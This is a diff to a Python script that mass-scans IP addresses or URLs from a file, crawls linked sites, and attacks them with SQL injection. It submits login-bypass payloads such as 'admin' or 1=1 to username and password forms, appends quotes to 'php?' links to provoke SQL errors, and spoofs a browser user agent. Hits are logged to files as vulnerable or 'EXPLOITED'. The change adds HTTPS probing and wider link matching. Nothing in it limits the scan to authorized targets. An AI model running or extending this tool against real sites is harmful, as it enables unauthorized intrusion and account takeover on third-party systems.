@@ -18,38 +18,44 @@ def presentation():
     print("[+] # #############################################")
 
 def gethref(url):
+    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
     ur = (url)
     print("[x] ~ SCAN: " + url + " ~ [x]")
     try:
-        req = requests.get(ur, timeout=6)
+        req = requests.get(ur, timeout=6, headers=headers)
         soup = BeautifulSoup(req.text, 'html.parser')
-        for link in soup.select('a[href*="?id="]'):
+        for link in soup.select('a[href*="php?"]'):
             okay = (link["href"])
             serv = (ur + okay + "'")
-            reeqee = requests.get(serv, timeout=6)
+            fo1 = open("maybeSQLi.txt", "a+")
+            fo1.write(serv + "\n")
+            fo1.close
+            print("      [+] Sending payload " + serv)
+            reeqee = requests.get(serv, timeout=6, headers=headers)
             souper = BeautifulSoup(reeqee.text, "html.parser")
-            if souper(text=lambda t: "SQL syntax" in t):
+            if souper(text=lambda t: "SQL" in t):
                 print(serv + " :  [!] VULN [!]")
                 fo = open("vulnSQLi.txt", "a+")
                 fo.write(serv + "\n")
                 fo.close
             else:
-                print("[x] found sqli but no pass [x] : " + serv )
+                print("[x] Found SQLi Input but not exploitible [x] : " + serv )
                 pass
     except:
-        print("[!] timed out: " + ur)
+        print("[!] Timed Out: " + ur)
 
 
 
 def try_connect(url, USERS, PASSWORDS, title):
 	print("trying")
+	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 	try:
 		payload = {
 			user_field: USERS.replace('\n', ''),
 			password_field: PASSWORDS.replace('\n', ''),
 		}
 		print("[+] PAYLOAD:", payload)
-		r2 = requests.post(url, data=payload)
+		r2 = requests.post(url, data=payload, headers=headers)
 		soup = bs4.BeautifulSoup(r2.text)
 		titlenew = str(soup.title)
 		#titlenew = (soup.select_one('title').text)
@@ -66,7 +72,7 @@ def try_connect(url, USERS, PASSWORDS, title):
 		
 def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_contain):
 	#print("made it")
-	print("[!] Extracting inputs")
+	#print("[!] Extracting inputs")
 	url = (site)
 	#print("here")
 	tree = html.fromstring(html_contain)
@@ -90,7 +96,7 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 		for i, name in enumerate(names):
 			if types[i] != "submit" and name != "submit":
 				ipnuts = ("   [++] > ", str(name), "{" + str(types[i]) + "}")
-				print(ipnuts)
+				#print(ipnuts)
 			fields = names
 			#print(fields)
 		break
@@ -104,35 +110,36 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 			password_field: PASSWORDS.replace('\n', ''),
 		}
 		#print("[+] PAYLOAD:", payload)
-		r2 = requests.post(url, data=payload, timeout=7)
+		r2 = requests.post(url, data=payload, timeout=7, headers=headers)
 		soup = BeautifulSoup(r2.content, 'lxml')
 		titlenew = (soup.select_one('title').text)
 		titlez = (titlenew + " : " + title)
 		if titlenew != title:
-			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
+			print(serv + " :  [!] LOGIN SQLI : EXPLOITED [!] " )
 			fo = open("vulnSQLi.txt", "a+")
 			fo.write(url + " " +titlez +" with: " +payload+ "\n")
 			fo.close
 		else:
 			print("   Login Found: Couldnt be cracked")
-			fo = open("LOGIN.txt", "a+")
-			fo.write(url + "\n" + str(ipnuts) + "\n")
-			fo.close
+			#fo = open("LOGIN.txt", "a+")
+			#fo.write(url + "\n" + str(ipnuts) + "\n")
+			#fo.close
 			gethref(url)
 			pass
 	except:
-		print("shit went south")
+		#print("shit went south")
 		gethref(url)
 		
 		
 
-def title(ip):
-	url = ("http://" + ip + "/")
+def title(url):
+	url = (url)
 	sitelists = []
 	#print("[+] Deep looking: " +url)
-	blacklist = ['*stackoverflow*', '*youtu*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
+	blacklist = ['*stackoverflow*', '*youtu*',  '*wikipedia*', '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
 	try:
-		rqt = requests.get(url, timeout=6, verify=True)
+		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
+		rqt = requests.get(url, timeout=6, verify=True, headers=headers)
 		soupr = BeautifulSoup(rqt.content, 'html.parser')
 		
 		for link in soupr.select('a[href*="http"]'):
@@ -143,52 +150,69 @@ def title(ip):
 			print("[!] Found Branch: " +site)
 			if site not in sitelists:
 				try:
-					r = requests.get(site, timeout=6, verify=True)
+					r = requests.get(site, timeout=6, verify=True, headers=headers)
 					soup = BeautifulSoup(r.content, 'lxml')
 					title = (soup.select_one('title').text)
 					USERS = ("admin' or 1=1 :-- ")
 					PASSWORDS = ("1' or 1=1 -- -")
 					user_field = ("username")
 					password_field = ("password")
-					print("[+] Branched scan: " + url + " : " + title + "  [+]")
+					print("[+] Branched: " + url + " : " + title + "  [+]")
 					kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
 					sitelists.append(site)
 					#print(sitelists)
 					#print("Appended branch: " + site) 
 					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
 				except:
-					print("   [!]Branch already scanned: " + site)
+					#print("Branch already scanned: " + site)
 					pass
 			else:
 				pass
 	except:
 		pass
 	try:
-		r = requests.get(url, timeout=6, verify=True)
+		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
+		r = requests.get(url, timeout=6, verify=True, headers=headers)
 		soup = BeautifulSoup(r.content, 'lxml')
 		title = (soup.select_one('title').text)
 		USERS = ("admin' or 1=1 :-- ")
 		PASSWORDS = ("1' or 1=1 -- -")
 		user_field = ("username")
 		password_field = ("password")
-		print("[+] " + url + " : " + title + "  [+]")
+		print(" [+] " + url + " : " + title + "  [+] ")
 		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
 		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
 	except:
 		gethref(url)
-
+def whatitbe(ip):
+	url = ("http://" + ip + "/")
+	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
+	try:
+		reqeer = requests.post(url, timeout=7, headers=headers)
+		title(url)
+	except:
+		#print("Going for https...")
+		pass
+	try:
+		url = ("https://" +ip+ "/")
+		reqeer = requests.post(url, timeout=7, headers=headers)
+		title(url)
+	except:
+		print("  [!] Site Timed Out- "+ip+" [!] ")
+		pass
 def main():
 	presentation()
 	count = 0
 	if len(sys.argv) < 3:
 		print("use -f for file")
 		ip = str(sys.argv[1])
-		title(ip)
+		whatitbe(ip)
 	else:
 		input_file = open(sys.argv[2])
 		#threads = (sys.argv[3])
 		for i in input_file.readlines():
 			ip = i.strip("\n")
-			title(ip)
+			whatitbe(ip)
 
 main()
+
